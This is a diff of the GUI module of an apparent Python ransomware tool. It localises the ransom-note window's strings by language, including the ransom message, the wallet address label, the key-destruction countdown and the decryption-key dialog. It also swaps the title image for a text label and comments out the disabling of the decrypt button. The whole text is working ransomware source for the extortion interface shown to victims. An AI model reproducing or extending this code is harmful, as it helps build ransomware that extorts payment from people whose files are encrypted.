@@ -175,11 +175,11 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		# Update Decryption percentage completion
 		if percentage_completion != 100:
 		  self.decryption_dialog.StatusText.SetLabelText(
-			  self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_DECRYPTING + " (%d%%)" % percentage_completion
+			  self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_DECRYPTING[self.LANG] + " (%d%%)" % percentage_completion
 			  )
 		else:
 		  self.decryption_dialog.StatusText.SetLabelText(
-			  self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_FINISHED + " (%d%%)" % percentage_completion
+			  self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_FINISHED[self.LANG] + " (%d%%)" % percentage_completion
 			  )
 		
 		# Update decryption gauge
@@ -194,9 +194,9 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		  self.decrypter.cleanup()
 		  # Update main window
 		  self.key_destruction_timer.Stop()
-		  self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_DECRYPTED)
+		  self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_DECRYPTED[self.LANG])
 		  self.FlashingMessageText.SetForegroundColour( wx.Colour(2, 217, 5) )
-		  self.KeyDestructionTime.SetLabelText(self.GUI_LABEL_TEXT_FILES_DECRYPTED)
+		  self.KeyDestructionTime.SetLabelText(self.GUI_LABEL_TEXT_FILES_DECRYPTED[self.LANG])
 		  self.KeyDestructionTime.SetForegroundColour( wx.Colour(2, 217, 5) )
 		  # Disable decryption dialog button
 		  self.EnterDecryptionKeyButton.Disable()
@@ -247,7 +247,7 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		self.decryption_dialog.DecryptionGauge.SetRange(100)
 		# Set encrypted file number
 		self.decryption_dialog.EncryptedFilesNumberLabel.SetLabelText(
-			self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_FILE_COUNT + str(
+			self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_FILE_COUNT[self.LANG] + str(
 				len(self.encrypted_files_list) - len(self.decrypted_files_list)
 				)
 		 	)
@@ -268,10 +268,10 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		# Check for valid key
 		key_contents = self.decryption_dialog.DecryptionKeyTextCtrl.GetLineText(0)
 		if len(key_contents) < 32:
-			self.decryption_dialog.StatusText.SetLabelText(self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_INVALID_KEY)
+			self.decryption_dialog.StatusText.SetLabelText(self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_INVALID_KEY[self.LANG])
 			return
 		else:
-			self.decryption_dialog.StatusText.SetLabelText(self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_DECRYPTING)
+			self.decryption_dialog.StatusText.SetLabelText(self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_DECRYPTING[self.LANG])
 
 		# Disable dialog buttons
 		self.decryption_dialog.OkCancelSizerOK.Disable()
@@ -299,7 +299,7 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		# Otherwise set to none found
 		else:
 			self.encrypted_files_dialog.EncryptedFilesTextCtrl.SetLabelText(
-				self.GUI_ENCRYPTED_FILES_DIALOG_NO_FILES_FOUND)
+				self.GUI_ENCRYPTED_FILES_DIALOG_NO_FILES_FOUND[self.LANG])
 		
 		
 		self.encrypted_files_dialog.Show()
@@ -316,7 +316,7 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 			self.set_message_to_null = False
 		# Set message to text
 		else:
-			self.FlashingMessageText.SetLabelText(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED)
+			self.FlashingMessageText.SetLabelText(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED[self.LANG])
 			self.set_message_to_null = True
 		
 		# Update the time remaining
@@ -324,12 +324,12 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		
 		# If the key has been destroyed, update the menu text
 		if not time_remaining:
-			self.KeyDestructionTime.SetLabelText(self.GUI_LABEL_TEXT_KEY_DESTROYED)
+			self.KeyDestructionTime.SetLabelText(self.GUI_LABEL_TEXT_KEY_DESTROYED[self.LANG])
 			# Set timer colour to black
 			self.KeyDestructionTime.SetForegroundColour( wx.SystemSettings_GetColour(
 				wx.SYS_COLOUR_CAPTIONTEXT))
 			# Disable decryption button
-			self.EnterDecryptionKeyButton.Disable()
+			#self.EnterDecryptionKeyButton.Disable()
 		else:
 			self.KeyDestructionTime.SetLabelText(time_remaining)
 		
@@ -359,16 +359,18 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		'''
 
 		# Set title
-		self.CrypterTitleBitmap.SetBitmap(
-			wx.Bitmap(
-				os.path.join(self.image_path, self.GUI_IMAGE_TITLE),
-				wx.BITMAP_TYPE_ANY))
+		#self.CrypterTitleBitmap.SetBitmap(
+		#	wx.Bitmap(
+		#		os.path.join(self.image_path, self.GUI_IMAGE_TITLE),
+		#		wx.BITMAP_TYPE_ANY))
+		
+		self.TitleLabel.SetLabel(self.GUI_LABEL_TEXT_TITLE[self.LANG])
 		
 		# Set flashing text initial label
-		self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED)
+		self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED[self.LANG])
 		
 		# Set Ransom Message
-		self.RansomNoteText.SetValue(self.GUI_RANSOM_MESSAGE)
+		self.RansomNoteText.SetValue(self.GUI_RANSOM_MESSAGE[self.LANG])
 
 		# Set Logo
 		self.LockBitmap.SetBitmap(
@@ -377,16 +379,16 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 				wx.BITMAP_TYPE_ANY))
 
 		# Set key destruction label
-		self.KeyDestructionLabel.SetLabel(self.GUI_LABEL_TEXT_KEY_DESTRUCTION)
+		self.KeyDestructionLabel.SetLabel(self.GUI_LABEL_TEXT_KEY_DESTRUCTION[self.LANG])
 
 		# Set Wallet Address label
-		self.WalletAddressLabel.SetLabel(self.GUI_LABEL_TEXT_WALLET_ADDRESS)
+		self.WalletAddressLabel.SetLabel(self.GUI_LABEL_TEXT_WALLET_ADDRESS[self.LANG])
 		
 		# Set Wallet Address Value
 		self.WalletAddressString.SetLabel(self.WALLET_ADDRESS)
 
 		# Set Button Text
-		self.ViewEncryptedFilesButton.SetLabel(self.GUI_BUTTON_TEXT_VIEW_ENCRYPTED_FILES)
-		self.EnterDecryptionKeyButton.SetLabel(self.GUI_BUTTON_TEXT_ENTER_DECRYPTION_KEY)
+		self.ViewEncryptedFilesButton.SetLabel(self.GUI_BUTTON_TEXT_VIEW_ENCRYPTED_FILES[self.LANG])
+		self.EnterDecryptionKeyButton.SetLabel(self.GUI_BUTTON_TEXT_ENTER_DECRYPTION_KEY[self.LANG])
 		
 		
